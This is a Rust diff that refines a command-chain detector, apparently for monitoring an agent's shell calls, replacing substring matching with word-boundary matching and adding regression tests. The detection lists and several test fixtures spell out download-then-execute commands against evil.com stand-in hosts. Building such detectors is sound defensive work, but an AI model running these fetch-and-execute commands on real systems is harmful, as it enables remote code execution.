@@ -75,6 +75,24 @@ impl Default for ChainContext {
     }
 }
 
+/// Check if a command starts with a given word (as a whole word, not substring).
+///
+/// "bash script.sh" matches "bash", but "bashrc" does not.
+/// "git show" does NOT match "sh".
+/// Also matches if the word appears after common prefixes like `cd /x &&`.
+fn cmd_starts_with_word(cmd: &str, word: &str) -> bool {
+    // Split the command into whitespace-separated tokens and check the first token.
+    // This handles both `bash script.sh` and `cd /path && bash script.sh`.
+    for part in cmd.split("&&").map(|s| s.trim()) {
+        if let Some(first_token) = part.split_whitespace().next() {
+            if first_token == word {
+                return true;
+            }
+        }
+    }
+    false
+}
+
 /// A chain of operations for a single session.
 #[derive(Debug, Clone)]
 pub struct SessionChain {
@@ -145,10 +163,15 @@ impl SessionChain {
 
     /// Detect download→execute pattern.
     ///
-    /// Looks for: curl/wget/fetch → chmod/bash/sh/exec
+    /// Looks for: curl/wget → chmod/bash/sh/exec
+    /// Uses word-boundary matching to avoid false positives like
+    /// "git fetch" matching "fetch" or "git show" matching "sh".
     fn detect_download_then_execute(&self) -> bool {
-        let download_commands = ["curl", "wget", "fetch", "aria2c"];
-        let execute_indicators = ["chmod", "bash", "sh", "zsh", "./", "exec", "source", "eval"];
+        // Only actual download commands — `fetch` removed because `git fetch`
+        // is a normal git operation, not downloading an executable.
+        let download_commands = ["curl", "wget", "aria2c"];
+        // Execute indicators that must match as whole words, not substrings.
+        let execute_commands = ["chmod", "bash", "sh", "zsh", "exec", "source", "eval"];
 
         let mut saw_download = false;
 
@@ -159,13 +182,24 @@ impl SessionChain {
                 .unwrap_or("")
                 .to_lowercase();
 
+            // Skip empty commands
+            if cmd_lower.is_empty() {
+                continue;
+            }
+
             if !saw_download {
-                if download_commands.iter().any(|d| cmd_lower.starts_with(d) || cmd_lower.contains(&format!(" {}", d))) {
+                // Check if this is an actual download command (word-boundary match)
+                if download_commands.iter().any(|d| cmd_starts_with_word(&cmd_lower, d)) {
                     saw_download = true;
                 }
             } else {
-                // After download, look for execute
-                if execute_indicators.iter().any(|e| cmd_lower.starts_with(e) || cmd_lower.contains(e)) {
+                // After download, look for execute — must be a word-boundary match
+                // to avoid "git show" matching "sh", "git stash" matching "sh", etc.
+                if execute_commands.iter().any(|e| cmd_starts_with_word(&cmd_lower, e)) {
+                    return true;
+                }
+                // Also check for "./" execution pattern (running a downloaded script)
+                if cmd_lower.starts_with("./") {
                     return true;
                 }
             }
@@ -215,10 +249,10 @@ impl SessionChain {
                     saw_sensitive_read = true;
                 }
             } else {
-                // After sensitive read, look for network activity
+                // After sensitive read, look for network activity (word-boundary match)
                 if let Some(cmd) = &op.command {
                     let lower = cmd.to_lowercase();
-                    if network_commands.iter().any(|n| lower.starts_with(n) || lower.contains(&format!(" {}", n))) {
+                    if network_commands.iter().any(|n| cmd_starts_with_word(&lower, n)) {
                         return true;
                     }
                 }
@@ -253,9 +287,9 @@ impl SessionChain {
             if let Some(cmd) = &op.command {
                 let lower = cmd.to_lowercase();
 
-                if suspicious_recon.iter().any(|r| lower.starts_with(r)) {
+                if suspicious_recon.iter().any(|r| cmd_starts_with_word(&lower, r)) {
                     suspicious_recon_count += 1;
-                } else if mild_recon.iter().any(|r| lower.starts_with(r)) {
+                } else if mild_recon.iter().any(|r| cmd_starts_with_word(&lower, r)) {
                     mild_recon_count += 1;
                 }
 
@@ -265,7 +299,7 @@ impl SessionChain {
                     || (suspicious_recon_count >= 1 && mild_recon_count >= 3)
                     || mild_recon_count >= 5;
 
-                if recon_threshold && exfil_indicators.iter().any(|e| lower.starts_with(e) || lower.contains(e)) {
+                if recon_threshold && exfil_indicators.iter().any(|e| cmd_starts_with_word(&lower, e)) {
                     return true;
                 }
             }
@@ -492,5 +526,78 @@ mod tests {
 
         assert_eq!(tracker.get_context("s1").operation_count, 1);
         assert_eq!(tracker.get_context("s2").operation_count, 1);
+    }
+
+    // --- Regression tests for false positive fixes ---
+
+    #[test]
+    fn test_git_fetch_then_git_diff_no_false_positive() {
+        // This was the most common false positive: git fetch → git diff
+        // triggered download→execute because "fetch" was in download list
+        // and "diff" was not, but "git show" contained "sh".
+        let tracker = make_tracker_with_ops(&[
+            ("Bash", Some("git fetch origin"), None, RiskLevel::Low),
+            ("Bash", Some("git diff main...HEAD"), None, RiskLevel::Low),
+        ]);
+        let ctx = tracker.get_context("test-session");
+        assert!(ctx.suspicious_patterns.is_empty(),
+            "git fetch + git diff should NOT trigger download→execute");
+    }
+
+    #[test]
+    fn test_git_fetch_then_git_show_no_false_positive() {
+        let tracker = make_tracker_with_ops(&[
+            ("Bash", Some("git fetch"), None, RiskLevel::Low),
+            ("Bash", Some("git show HEAD"), None, RiskLevel::Low),
+        ]);
+        let ctx = tracker.get_context("test-session");
+        assert!(ctx.suspicious_patterns.is_empty(),
+            "git fetch + git show should NOT trigger download→execute");
+    }
+
+    #[test]
+    fn test_git_fetch_then_git_stash_no_false_positive() {
+        let tracker = make_tracker_with_ops(&[
+            ("Bash", Some("git fetch --all"), None, RiskLevel::Low),
+            ("Bash", Some("git stash pop"), None, RiskLevel::Low),
+        ]);
+        let ctx = tracker.get_context("test-session");
+        assert!(ctx.suspicious_patterns.is_empty(),
+            "git fetch + git stash should NOT trigger download→execute");
+    }
+
+    #[test]
+    fn test_curl_then_bash_still_detected() {
+        // Real attack pattern should still be caught
+        let tracker = make_tracker_with_ops(&[
+            ("Bash", Some("curl -O https://evil.com/payload.sh"), None, RiskLevel::Medium),
+            ("Bash", Some("bash payload.sh"), None, RiskLevel::Medium),
+        ]);
+        let ctx = tracker.get_context("test-session");
+        assert!(ctx.suspicious_patterns.contains(&SuspiciousPattern::DownloadThenExecute),
+            "curl + bash should still be detected");
+    }
+
+    #[test]
+    fn test_wget_then_dotslash_still_detected() {
+        let tracker = make_tracker_with_ops(&[
+            ("Bash", Some("wget https://evil.com/exploit"), None, RiskLevel::Medium),
+            ("Bash", Some("./exploit"), None, RiskLevel::Medium),
+        ]);
+        let ctx = tracker.get_context("test-session");
+        assert!(ctx.suspicious_patterns.contains(&SuspiciousPattern::DownloadThenExecute),
+            "wget + ./exploit should still be detected");
+    }
+
+    #[test]
+    fn test_cmd_starts_with_word_helper() {
+        assert!(cmd_starts_with_word("curl https://x.com", "curl"));
+        assert!(cmd_starts_with_word("bash script.sh", "bash"));
+        assert!(cmd_starts_with_word("sh -c 'echo hi'", "sh"));
+        assert!(!cmd_starts_with_word("git show HEAD", "sh"));
+        assert!(!cmd_starts_with_word("git stash pop", "sh"));
+        assert!(!cmd_starts_with_word("pushd /tmp", "sh"));
+        assert!(!cmd_starts_with_word("git fetch origin", "fetch"));
+        assert!(cmd_starts_with_word("cd /tmp && bash x.sh", "bash"));
     }
 }
